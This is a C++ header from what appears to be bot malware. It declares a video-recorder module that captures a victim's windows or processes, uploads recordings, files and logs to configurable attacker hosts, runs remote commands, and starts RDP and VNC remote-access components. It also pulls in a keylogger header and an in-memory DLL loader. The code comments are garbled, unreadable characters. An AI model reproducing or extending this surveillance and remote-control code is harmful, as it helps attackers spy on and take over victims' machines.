#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"
#include "DllLoader.h"
#include "Pipes.h"


// ��������� ��������� ��� �������
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false


// ���� ������� ����� �����
const DWORD VIDEORECORD_DEFAULT_PORT = 700;



static const int VIDEO_FULLSCREEN	= 0x0001; //������������� ������
static const int VIDEO_ALWAYS		= 0x0002; //���������� ������, ���� ���� ���� �� �������


//****************************************************
//  TVideoRecDLL - ����� ��� ������ � �����������
//                 �����������
//****************************************************
class TVideoRecDLL : public TMemoryDLL
{
private:

	// ���������� ���� �������
	//������� ������������ � ������������ ���
	typedef DWORD (WINAPI *TInit)( const char* uid, int flags, const char* ip, int port, int downtime );
	typedef void (WINAPI *TRelease)( DWORD server );
	typedef DWORD (WINAPI *TAddIPServer)( DWORD server, const char* ip, int port );

	//������� ������ �����
	typedef VOID (WINAPI *TStartRecHwnd	)( DWORD server, char* uid, char* nameVideo, HWND wnd, int seconds, int flags ) ;
	typedef VOID (WINAPI *TStartRecPid  )( DWORD server, char* uid, char* nameVideo, DWORD pid, int seconds, int flags );
	typedef VOID (WINAPI *TStopRec		)();
	typedef VOID (WINAPI *TResetTimer	)();

	//������� �������� ������
	typedef VOID (WINAPI *TStartSend	)( DWORD server, char* name, char* path, int after );
	typedef DWORD (WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int after );
	typedef DWORD (WINAPI *TIsSendedAsync )( DWORD );

	//������� �������� ����� �� ������
	typedef void (WINAPI *TSendLog)( DWORD server, const char* name, int code, const char* text );

	//������ ������ ���������� ������ �������
public:
	typedef DWORD (WINAPI *typeCallbackCmd)( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
private:
	typedef VOID (WINAPI *TRunCmdExec)( DWORD server, typeCallbackCmd );

	void InitializeApi();
	void LoadFunc(const char* Name, LPVOID &Addr);

public:

	static const int Hibernation = 0x0001; //������ � ������ ������ (����� �� ����������� � �������, � ������ ��� �������� ������)
	static const int RunCallback = 0x1000; //������ callback ������� CallbackCmd �� VideoRecorder.cpp

	TVideoRecDLL();
	~TVideoRecDLL();

	TInit				Init;
	TRelease			Release;
	TAddIPServer		AddIPServer;
	TStartRecHwnd		RecordWnd;
	TStartRecPid		RecordProcess;
	TStopRec			RecordStop;
	TResetTimer			ResetTimer;
	TStartSend			SendFiles;
	TStartSendAsync		StartSendAsync;
	TIsSendedAsync		IsSendedAsync;
	TRunCmdExec			RunCmdExec;
	TSendLog			SendLog;

};

namespace VideoProcess
{

//�������������� ����� ��� � �������� ���� ����� ��� ������ ������ �� ����������
bool Start();
//���������� ������ ����� ��������
void Stop();
//���������� ��� ���� ������ ��� ����� ��������
char* GetNamePipe( char* buf );

//������� ����� ����� ����� �������� ������� ����� ���. ����� ��� ������ ���� ��������
//� ������������ ���������� � ��������� ��������
int Init( int flags, const char* ip, int port, int downtime );
bool RecordHWND( int server, const char* name, HWND wnd, int seconds = 0, int flags = 0 );
bool RecordPID( int server, const char* name, DWORD pid = 0, int seconds = 0, int flags = 0 );
void RecordStop();
DWORD SendFiles( int server, const char* name, const char* path, int after = 0, bool async = false );
bool FilesIsSended(DWORD id);
bool SendLog( int server, const char* name, int code, const char* text );
//������ rdp.dll
DWORD WINAPI ProcessRDP(void*);
//������ vnc.exe
DWORD WINAPI ProcessVNC(void*);
};

//����� ��� ��������� �������� �����, ��� ������������ ��� ����, ����� �� ������ ��� � ������ �������
class VideoLog : public TBotObject
{
		const char* name;

	public:

		VideoLog( const char* _name ) : name(_name)
		{
		}
		void Send( int code, const char* format, ... );
		void Send2(int code, const char* text )
		{
			Send2( name, code, text );
		}

		//�������� ���� �� ������:
		//name - ��� ����
		//code - ��� ����
		//format - ��������������� ����� ����
		static void Send( const char* name, int code, const char* format, ... );
		static void SendV( const char* name, int code, const char* format, va_list va );
		//���� ����� ��� � Send ������ ��� �������������� ������
		static void Send2( const char* name, int code, const char* text )
		{
			VideoProcess::SendLog( 0, name, code, text );
		}

};

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();
//��������� ������� �����, � ���������� ����������� ���� ����� ������� (���� ������� ����� � �������), ���� ������� ����� 
//���������� �������� ����� ������, ��� ������� ��������� �����-��� � ���� �����-��� ���� ����� �����
//��� ��������, ���������� ��������� �� ����������, ����� ������� ����� �������������
//TVideoRecDLL* RunPortForward( const char* ip );
//��������� �����-��� � ��������� �����
bool SaveVideoDll( const char* nameFile );

void StartVideoFromCurrentURL();


#endif
